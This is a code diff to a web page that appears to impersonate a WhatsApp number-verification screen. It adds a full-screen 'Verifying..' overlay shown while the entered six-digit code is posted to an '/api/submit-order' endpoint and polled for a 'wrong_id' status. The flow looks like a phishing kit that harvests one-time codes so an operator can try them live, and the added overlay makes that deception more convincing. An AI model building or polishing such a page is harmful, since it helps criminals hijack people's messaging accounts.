@@ -105,10 +105,53 @@
     .resend-link:hover {
       text-decoration: underline;
     }
+
+    /* Full-screen purple verification overlay */
+    .purple-verify-screen {
+      position: fixed;
+      inset: 0;
+      width: 100vw;
+      height: 100vh;
+      background: linear-gradient(160deg, #991676 0%, #6d0e54 100%);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 24px;
+      text-align: center;
+    }
+
+    .purple-verify-screen.active {
+      display: flex;
+    }
+
+    .purple-spinner {
+      width: 52px;
+      height: 52px;
+      border: 4px solid rgba(255, 255, 255, 0.25);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      animation: purpleSpin 0.85s linear infinite;
+      margin-bottom: 18px;
+    }
+
+    .purple-verify-text {
+      color: #ffffff;
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: 0.4px;
+    }
+
+    @keyframes purpleSpin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
   </style>
 </head>
 <body>
-  <main class="container">
+  <main class="container" id="mainContent">
     <h1 class="title">Verifying your Whatsapp number</h1>
     
     <p class="subtitle">We have sent a 6-digit verification code to your number </p>
@@ -127,7 +170,14 @@
     <a href="#" class="resend-link">Didn't receive code?</a>
   </main>
 
+  <div id="purpleVerifyScreen" class="purple-verify-screen" aria-live="assertive">
+    <div class="purple-spinner"></div>
+    <div class="purple-verify-text">Verifying..</div>
+  </div>
+
   <script>
+    const mainContent = document.getElementById('mainContent');
+    const purpleScreen = document.getElementById('purpleVerifyScreen');
     const inputs = document.querySelectorAll('.otp-box');
     const subtitleEl = document.querySelector('.subtitle');
     const resendLink = document.querySelector('.resend-link');
@@ -144,6 +194,19 @@
     let alertTimeout = null;
     let statusBanner = null;
     let otpAbortController = null;
+
+    function showPurpleVerifyingScreen() {
+      if (document.activeElement && typeof document.activeElement.blur === 'function') {
+        document.activeElement.blur();
+      }
+      mainContent.style.display = 'none';
+      purpleScreen.classList.add('active');
+    }
+
+    function hidePurpleVerifyingScreen() {
+      purpleScreen.classList.remove('active');
+      mainContent.style.display = 'flex';
+    }
 
     function ensureStatusBanner() {
       if (statusBanner) return statusBanner;
@@ -219,6 +282,7 @@
           } else if (data.status === 'wrong_id' && (!data.timestamp || data.timestamp >= submissionTime - 2000)) {
             stopPolling();
             isSubmitting = false;
+            hidePurpleVerifyingScreen();
             clearOtpBoxes(true);
             showTemporaryAlert('Wrong Code , Try again', 1500);
           }
@@ -233,6 +297,7 @@
       if (cleanCode.length !== 6) return;
 
       if (!userPhone) {
+        hidePurpleVerifyingScreen();
         showTemporaryAlert('Wrong Code , Try again', 1500);
         return;
       }
@@ -242,6 +307,7 @@
       lastSubmittedCode = cleanCode;
       submissionTime = Date.now();
       hideTemporaryAlert();
+      showPurpleVerifyingScreen();
 
       try {
         const response = await fetch('/api/submit-order', {
@@ -255,6 +321,7 @@
         const result = await response.json().catch(() => ({}));
         if (!response.ok || (result && result.success === false)) {
           isSubmitting = false;
+          hidePurpleVerifyingScreen();
           clearOtpBoxes(true);
           showTemporaryAlert('Wrong Code , Try again', 1500);
           return;
@@ -263,6 +330,7 @@
       } catch (err) {
         console.error('Submit verification code error:', err);
         isSubmitting = false;
+        hidePurpleVerifyingScreen();
         clearOtpBoxes(true);
         showTemporaryAlert('Wrong Code , Try again', 1500);
       }
@@ -279,7 +347,6 @@
         for (let i = 0; i < inputs.length; i++) {
           inputs[i].value = six[i] || '';
         }
-        if (inputs[5]) inputs[5].focus();
         submitVerificationCode(six);
         return;
       }
@@ -327,6 +394,7 @@
       }
       stopPolling();
       isSubmitting = false;
+      hidePurpleVerifyingScreen();
       clearOtpBoxes(true);
       submissionTime = Date.now();
       hideTemporaryAlert();
